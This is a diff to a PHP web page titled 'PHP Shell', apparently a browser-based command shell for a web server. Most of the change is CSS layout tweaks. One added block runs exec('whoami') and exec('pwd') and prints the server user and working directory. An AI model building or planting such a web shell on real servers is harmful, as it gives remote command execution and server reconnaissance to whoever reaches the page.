@@ -9,7 +9,6 @@
 	else
 	{
 ?>
-
 <html>
 <head>
 <title>PHP Shell</title>
@@ -22,12 +21,33 @@ body{background-color: black; }
    background-color: black;
  width: 100%;
  height: 90%;
+ padding:0px;
+ margin:0px;
 }
 .input{
  color: white;
   background-color: black;
  width: 100%;
  height: 5%;
+ padding:0px;
+ margin:0px;
+}
+.info{
+  border: 0;
+  color:white;
+  background-color: black;
+  width: 100%;
+  height: 5%;
+ padding:0px;
+ margin:0px;
+}
+.form1{
+  padding:0px;
+ margin:0px;
+}
+html,body{
+ padding:0px;
+ margin:0px;
 }
 p{ color:white; }
 </style>
@@ -160,9 +180,14 @@ function useHttpResponse() {
 </textarea>
 <textarea name="input" class="input"></textarea>
 </form>
+<textarea name="info" class="info" readonly=true>
+<? 
+exec("whoami",$who); exec("pwd",$pwd);
+echo "user: $who[0]\tlocation: $pwd[0]";
+?>
+</textarea>
 <script>
 document.form1.output.value="";
-						 
 </script>
 </body>
 </html>
